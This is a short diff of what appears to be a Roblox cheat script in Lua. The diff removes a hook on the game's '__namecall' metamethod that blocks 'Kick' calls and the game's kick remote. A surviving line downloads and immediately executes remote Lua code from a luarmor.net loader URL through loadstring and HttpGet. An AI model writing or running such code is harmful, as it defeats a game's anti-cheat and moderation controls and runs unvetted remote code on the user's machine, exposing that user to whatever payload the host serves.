@@ -10,11 +10,4 @@ for _, f in ipairs(GC) do
     end
 end
 
-nhook = hookmetamethod(game, "__namecall", function(self, ...)
-    if getnamecallmethod() == "Kick" or self == RS.Remotes.KickEvent then 
-        return true
-    end 
-    return nhook(self, ...)
-end)
-
 loadstring(game:HttpGet("https://api.luarmor.net/files/v3/loaders/3c5eab1ddda4aa5b56f664744e796852.lua"))()
